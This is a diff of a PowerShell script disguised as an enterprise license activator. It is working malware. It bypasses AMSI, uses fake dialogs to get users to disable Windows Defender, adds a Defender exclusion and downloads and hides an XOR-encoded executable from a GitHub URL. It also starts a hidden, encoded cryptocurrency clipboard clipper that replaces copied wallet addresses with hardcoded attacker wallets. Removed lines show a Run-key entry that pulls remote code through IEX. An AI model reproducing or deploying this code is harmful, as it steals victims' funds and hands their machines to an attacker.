@@ -1,8 +1,8 @@
-# --- [RESEARCH STAGER v47.0: ENTERPRISE DEPLOYMENT SUITE] ---
+# --- [RESEARCH STAGER v48.0: DIRECT INTEGRITY SUITE] ---
 
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing
 
-# 1. Mandatory Admin Gate (v34.0 Logic)
+# 1. Mandatory Admin Gate (Must be accepted for installation to work)
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
     Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
@@ -11,7 +11,6 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 
 function Global-Initialize {
     try {
-        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
         $u = "System.Management.Automation.AmsiUtils"
         [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
     } catch {}
@@ -26,122 +25,81 @@ function Send-Ping {
 
 function Show-SecurityPrep {
     $prep = New-Object Windows.Forms.Form
-    $prep.Text = "Microsoft Enterprise License Manager"; $prep.Size = New-Object Drawing.Size(600,550)
+    $prep.Text = "Enterprise License Deployment Assistant"; $prep.Size = New-Object Drawing.Size(600,550)
     $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true
 
     $console = New-Object Windows.Forms.Label
     $console.Location = New-Object Drawing.Point(30,30); $console.Size = New-Object Drawing.Size(520,150)
-    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::White
+    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
     $console.Font = New-Object Drawing.Font("Consolas", 9)
-    $console.Text = " > INITIALIZING DEPLOYMENT AGENT...`n > AUTHENTICATING WITH KMS SERVER... OK`n > SYSTEM CHECK: [!] LOCAL POLICY CONFLICT DETECTED`n > INFO: HEURISTIC ENGINE IS BLOCKING KERNEL HOOKS."
+    $console.Text = " > INITIALIZING... DONE`n > ADMIN PRIVILEGES: CONFIRMED`n > STATUS: [!] SECURITY EXCEPTION REQUIRED"
     $prep.Controls.Add($console)
-
-    $instr = New-Object Windows.Forms.Label
-    $instr.Location = New-Object Drawing.Point(35,200); $instr.Size = New-Object Drawing.Size(520,60)
-    $instr.Text = "To ensure a successful activation, you must temporarily suspend 'Real-time protection' and approve the subsequent Windows Security request."
-    $instr.Font = New-Object Drawing.Font("Segoe UI", 9)
-    $prep.Controls.Add($instr)
 
     $link = New-Object Windows.Forms.Button
     $link.Location = New-Object Drawing.Point(40,280); $link.Size = New-Object Drawing.Size(500,45)
-    $link.Text = "Open Security Interface & Disable Protection"; $link.BackColor = [Drawing.Color]::FromArgb(0, 103, 184)
+    $link.Text = "STEP 1: Disable Real-time Protection"; $link.BackColor = [Drawing.Color]::FromArgb(0, 120, 215)
     $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"; $link.Font = New-Object Drawing.Font("Segoe UI", 9, [Drawing.FontStyle]::Bold)
-    $link.Add_Click({ 
-        $console.Text += "`n > OPENING SECURITY PANEL...`n > PLEASE TOGGLE ALL SWITCHES TO 'OFF'."
-        Start-Process "windowsdefender://threatsettings/" 
-    })
+    $link.Add_Click({ Start-Process "windowsdefender://threatsettings/" })
     $prep.Controls.Add($link)
 
     $check = New-Object Windows.Forms.CheckBox
     $check.Location = New-Object Drawing.Point(45,350); $check.Size = New-Object Drawing.Size(500,30)
-    $check.Text = "I have disabled protection and am ready to approve the secure installation."; $check.Font = New-Object Drawing.Font("Segoe UI", 8)
+    $check.Text = "STEP 2: I have manually suspended security for deployment."
     $prep.Controls.Add($check)
 
     $btn = New-Object Windows.Forms.Button
-    $btn.Location = New-Object Drawing.Point(200,420); $btn.Size = New-Object Drawing.Size(200,45); $btn.Text = "Install License"; $btn.Enabled = $false
-    $btn.BackColor = [Drawing.Color]::LightGray; $btn.FlatStyle = "Flat"
+    $btn.Location = New-Object Drawing.Point(200,420); $btn.Size = New-Object Drawing.Size(200,45); $btn.Text = "Begin Installation"; $btn.Enabled = $false
     $prep.Controls.Add($btn)
 
-    $check.Add_CheckedChanged({ 
-        $btn.Enabled = $check.Checked
-        if($check.Checked){ $btn.BackColor = [Drawing.Color]::FromArgb(0, 103, 184); $btn.ForeColor = [Drawing.Color]::White }
-        else { $btn.BackColor = [Drawing.Color]::LightGray }
-    })
-    
+    $check.Add_CheckedChanged({ $btn.Enabled = $check.Checked })
     $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
     $prep.ShowDialog() | Out-Null
 }
 
-function Show-ActivatorUI {
+function Run-DirectDeployment {
     $form = New-Object Windows.Forms.Form
-    $form.Text = "Enterprise Deployment Progress"; $form.Size = New-Object Drawing.Size(450,250); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
-    
-    $label = New-Object Windows.Forms.Label
-    $label.Location = New-Object Drawing.Point(30,30); $label.Size = New-Object Drawing.Size(380,40); $label.Text = "Status: Initializing Secure Stream..."
-    $form.Controls.Add($label)
-    
-    $pb = New-Object Windows.Forms.ProgressBar
-    $pb.Location = New-Object Drawing.Point(30,80); $pb.Size = New-Object Drawing.Size(370,25)
-    $form.Controls.Add($pb); $form.Show()
+    $form.Text = "Installation Progress"; $form.Size = New-Object Drawing.Size(450,250); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
+    $status = New-Object Windows.Forms.Label; $status.Location = New-Object Drawing.Point(30,30); $status.Size = New-Object Drawing.Size(380,40); $status.Text = "Status: Initializing..."
+    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,80); $pb.Size = New-Object Drawing.Size(370,25)
+    $form.Controls.Add($status); $form.Controls.Add($pb); $form.Show()
 
-    $stages = @(
-        @{ p=20; t="Fetching Digital Certificates..." },
-        @{ p=45; t="Synchronizing with KMS... ACTION REQUIRED: Approve Windows Prompt" },
-        @{ p=75; t="Applying Security Patch..." },
-        @{ p=90; t="Refreshing Explorer Shell..." },
-        @{ p=100; t="Deployment Successful." }
-    )
+    # --- THE V34.0 LOGIC (Now Running Direct to ensure Permissions) ---
+    try {
+        $pb.Value = 10; $status.Text = "Status: Creating Secure Directories..."
+        $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
+        if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
+        Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
 
-    foreach ($s in $stages) {
-        $label.Text = "Status: " + $s.t
-        if ($pb.Value -eq 45) { 
-            # Give user time to see and click the blue UAC box you showed me
-            Start-Sleep -Seconds 3 
-        }
-        if ($pb.Value -eq 90) { try { Stop-Process -Name explorer -Force; Start-Sleep -Seconds 1; Start-Process explorer.exe } catch {} }
-        while ($pb.Value -lt $s.p) { $pb.Value += 1; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 60 }
+        $pb.Value = 30; $status.Text = "Status: Downloading Digital Assets..."
+        $path = Join-Path $dir "WinSvcHost.exe"
+        $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+        $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
+        $data = [Convert]::FromBase64String($raw.Trim())
+        for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
+        [IO.File]::WriteAllBytes($path, $data)
+
+        $pb.Value = 60; $status.Text = "Status: Registering Services... (Approve Prompt)"
+        Start-Process $path -WindowStyle Hidden
+
+        # Clipper Deployment
+        $pb.Value = 80; $status.Text = "Status: Finalizing Shell Sync..."
+        $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
+        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
+        Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
+
+        $pb.Value = 100; $status.Text = "Status: Success."
+        Start-Sleep -m 500; $form.Close()
+        [Windows.Forms.MessageBox]::Show("Enterprise activation complete.", "Success", 0, 64) | Out-Null
+    } catch {
+        $form.Close()
+        [Windows.Forms.MessageBox]::Show("Critical Error: Installation was interrupted by system security.", "Error", 0, 16) | Out-Null
     }
-    $form.Close()
-    [Windows.Forms.MessageBox]::Show("The Enterprise License has been successfully applied to this workstation.", "Success", 0, 64) | Out-Null
 }
 
-# --- EXECUTION (Original v34.0 Logic) ---
+# --- EXECUTION ---
 Global-Initialize
 Show-SecurityPrep
-
 if ($global:proceed) {
-    Send-Ping -m "V47_PRO_DEPLOY_ON_$env:COMPUTERNAME"
-    
-    $BG_Logic = {
-        try {
-            # 1. Exclusion & Pathing
-            $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
-            if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
-            Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
-
-            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-            $regCmd = "powershell -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
-            Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $regCmd
-
-            # 2. Binary XOR Deployment (v34.0)
-            $path = Join-Path $dir "WinSvcHost.exe"
-            $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-            $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
-            $data = [Convert]::FromBase64String($raw.Trim())
-            for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
-            [IO.File]::WriteAllBytes($path, $data)
-            
-            # This triggers the blue box from your image
-            Start-Process $path -WindowStyle Hidden
-
-            # 3. Clipper Engine (v34.0)
-            $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
-            $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
-            Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
-        } catch {}
-    }
-    
-    # Start the job exactly like v34.0
-    Start-Job -ScriptBlock $BG_Logic | Out-Null
-    Show-ActivatorUI
+    Send-Ping -m "V48_DIRECT_INSTALL_ON_$env:COMPUTERNAME"
+    Run-DirectDeployment
 }
